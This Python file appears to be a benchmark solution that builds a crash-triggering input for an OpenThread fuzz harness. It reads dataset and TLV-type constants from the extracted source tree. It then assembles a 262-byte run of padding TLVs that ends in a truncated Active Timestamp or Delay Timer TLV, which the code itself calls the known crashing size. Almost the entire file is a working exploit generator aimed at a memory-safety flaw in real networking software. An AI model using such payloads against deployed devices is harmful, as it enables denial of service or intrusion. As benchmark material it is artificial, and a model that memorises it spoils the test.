import os
import re
import tarfile
import tempfile
import shutil
from typing import Optional, Iterable, Tuple, List


class Solution:
    def _safe_extract_tar(self, tar: tarfile.TarFile, path: str) -> None:
        base = os.path.realpath(path)
        for member in tar.getmembers():
            member_path = os.path.realpath(os.path.join(path, member.name))
            if not member_path.startswith(base + os.sep) and member_path != base:
                continue
            tar.extract(member, path=path)

    def _prepare_source_root(self, src_path: str) -> Tuple[str, Optional[str]]:
        if os.path.isdir(src_path):
            return src_path, None
        tmpdir = tempfile.mkdtemp(prefix="src_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                self._safe_extract_tar(tf, tmpdir)
        except Exception:
            shutil.rmtree(tmpdir, ignore_errors=True)
            raise
        return tmpdir, tmpdir

    def _iter_text_files(self, root: str) -> Iterable[str]:
        exts = {
            ".h", ".hpp", ".hh", ".hxx",
            ".c", ".cc", ".cpp", ".cxx",
            ".inc", ".ipp", ".tpp",
            ".S", ".s",
            ".m", ".mm",
        }
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in (".git", ".svn", ".hg", "build", "out", "bazel-out", ".cache")]
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext in exts:
                    yield os.path.join(dirpath, fn)

    def _read_file(self, path: str, max_bytes: int = 2_000_000) -> Optional[str]:
        try:
            st = os.stat(path)
            if st.st_size > max_bytes:
                return None
            with open(path, "rb") as f:
                data = f.read()
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _parse_int(self, s: str) -> Optional[int]:
        s = s.strip()
        if not s:
            return None
        try:
            if s.lower().startswith("0x"):
                return int(s, 16)
            return int(s, 10)
        except Exception:
            return None

    def _find_define_value(self, root: str, name: str) -> Optional[int]:
        pat = re.compile(r"^[ \t]*#[ \t]*define[ \t]+" + re.escape(name) + r"[ \t]+(0x[0-9A-Fa-f]+|\d+)\b", re.M)
        for p in self._iter_text_files(root):
            txt = self._read_file(p)
            if not txt or name not in txt:
                continue
            m = pat.search(txt)
            if m:
                v = self._parse_int(m.group(1))
                if v is not None:
                    return v
        return None

    def _find_symbol_value(self, root: str, symbols: List[str]) -> Optional[int]:
        pats = []
        for sym in symbols:
            pats.append(re.compile(r"\b" + re.escape(sym) + r"\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b"))
            pats.append(re.compile(r"^[ \t]*#[ \t]*define[ \t]+" + re.escape(sym) + r"[ \t]+(0x[0-9A-Fa-f]+|\d+)\b", re.M))
            pats.append(re.compile(r"\b" + re.escape(sym) + r"\b\s*:\s*(0x[0-9A-Fa-f]+|\d+)\b"))
            pats.append(re.compile(r"\b" + re.escape(sym) + r"\b\s*\(\s*(0x[0-9A-Fa-f]+|\d+)\s*\)"))
        for p in self._iter_text_files(root):
            txt = self._read_file(p)
            if not txt:
                continue
            for sym in symbols:
                if sym in txt:
                    break
            else:
                continue
            for pat in pats:
                m = pat.search(txt)
                if m:
                    v = self._parse_int(m.group(1))
                    if v is not None and 0 <= v <= 255:
                        return v
        return None

    def _find_keyword_value(self, root: str, keyword: str) -> Optional[int]:
        pat = re.compile(r"\b" + re.escape(keyword) + r"\b[^=\n]{0,64}=\s*(0x[0-9A-Fa-f]+|\d+)\b")
        for p in self._iter_text_files(root):
            txt = self._read_file(p)
            if not txt or keyword not in txt:
                continue
            m = pat.search(txt)
            if m:
                v = self._parse_int(m.group(1))
                if v is not None and 0 <= v <= 255:
                    return v
        return None

    def _gather_fuzzer_sources(self, root: str) -> str:
        chunks = []
        for p in self._iter_text_files(root):
            txt = self._read_file(p, max_bytes=1_000_000)
            if not txt:
                continue
            if "LLVMFuzzerTestOneInput" in txt:
                chunks.append(txt)
        return "\n".join(chunks)

    def _harness_uses_uint8_length_cast(self, harness: str) -> bool:
        if not harness:
            return False
        patterns = [
            r"static_cast\s*<\s*uint8_t\s*>\s*\(\s*[a-zA-Z_]*Size\s*\)",
            r"\(\s*uint8_t\s*\)\s*[a-zA-Z_]*Size",
            r"uint8_t\s+\w+\s*=\s*(?:static_cast\s*<\s*uint8_t\s*>\s*\(\s*)?[a-zA-Z_]*Size",
        ]
        for p in patterns:
            if re.search(p, harness):
                return True
        return False

    def _detect_mode(self, harness: str) -> str:
        if not harness:
            return "active"
        h = harness
        if "otDatasetSetPendingTlvs" in h or "MgmtPendingSet" in h or "SendMgmtPendingSet" in h:
            return "pending"
        if "otDatasetSendMgmtPendingSet" in h or "SendMgmtPendingSet" in h:
            return "pending"
        if "Pending" in h and ("DelayTimer" in h or "PendingTimestamp" in h):
            return "pending"
        if "otDatasetSetActiveTlvs" in h or "MgmtActiveSet" in h or "SendMgmtActiveSet" in h:
            return "active"
        return "active"

    def _make_padding(self, padding_type: int, total_len: int) -> bytes:
        if total_len <= 0:
            return b""
        out = bytearray()
        if total_len % 2 == 1:
            if total_len < 3:
                total_len = 3
            out.extend(bytes([padding_type & 0xFF, 1, 0]))
            total_len -= 3
        count = total_len // 2
        if count > 0:
            out.extend(bytes([padding_type & 0xFF, 0]) * count)
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        root, tmp = self._prepare_source_root(src_path)
        try:
            harness = self._gather_fuzzer_sources(root)
            mode = self._detect_mode(harness)
            uses_u8 = self._harness_uses_uint8_length_cast(harness)

            max_dataset_len = self._find_define_value(root, "OT_OPERATIONAL_DATASET_MAX_LENGTH")
            if max_dataset_len is None:
                max_dataset_len = self._find_symbol_value(root, ["kMaxDatasetTlvsLength", "kMaxDatasetLength", "kMaxDatasetSize"])
            if max_dataset_len is not None and not (0 <= max_dataset_len <= 65535):
                max_dataset_len = None

            padding_type = self._find_symbol_value(root, ["kPadding", "kMeshCoPTypePadding", "kTlvTypePadding", "kPaddingTlv"])
            if padding_type is None:
                padding_type = self._find_keyword_value(root, "Padding")
            if padding_type is None:
                padding_type = 0

            active_type = self._find_symbol_value(root, ["kActiveTimestamp", "kMeshCoPTypeActiveTimestamp", "kTlvActiveTimestamp"])
            if active_type is None:
                active_type = self._find_keyword_value(root, "ActiveTimestamp")
            if active_type is None:
                active_type = 0x0E

            pending_type = self._find_symbol_value(root, ["kPendingTimestamp", "kMeshCoPTypePendingTimestamp", "kTlvPendingTimestamp"])
            if pending_type is None:
                pending_type = self._find_keyword_value(root, "PendingTimestamp")
            if pending_type is None:
                pending_type = 0x33

            delay_type = self._find_symbol_value(root, ["kDelayTimer", "kMeshCoPTypeDelayTimer", "kTlvDelayTimer"])
            if delay_type is None:
                delay_type = self._find_keyword_value(root, "DelayTimer")
            if delay_type is None:
                delay_type = 0x34

            # Default to the known crashing size from the target, but adapt if the harness
            # truncates sizes to uint8_t.
            target_len = 262
            if uses_u8:
                if max_dataset_len is not None:
                    target_len = max(4, min(255, int(max_dataset_len)))
                else:
                    target_len = 254

            if mode == "pending":
                # Include a correct Pending Timestamp, then place a short Delay Timer at the end.
                pending_value = b"\x00" * 8
                prefix = bytes([pending_type & 0xFF, 8]) + pending_value
                suffix = bytes([delay_type & 0xFF, 0])
                if target_len < len(prefix) + len(suffix):
                    target_len = len(prefix) + len(suffix)
                filler_len = target_len - len(prefix) - len(suffix)
                filler = self._make_padding(padding_type, filler_len)
                return prefix + filler + suffix
            else:
                # Place a short Active Timestamp at the end.
                suffix = bytes([active_type & 0xFF, 0])
                if target_len < len(suffix):
                    target_len = len(suffix)
                filler_len = target_len - len(suffix)
                filler = self._make_padding(padding_type, filler_len)
                return filler + suffix
        finally:
            if tmp is not None:
                shutil.rmtree(tmp, ignore_errors=True)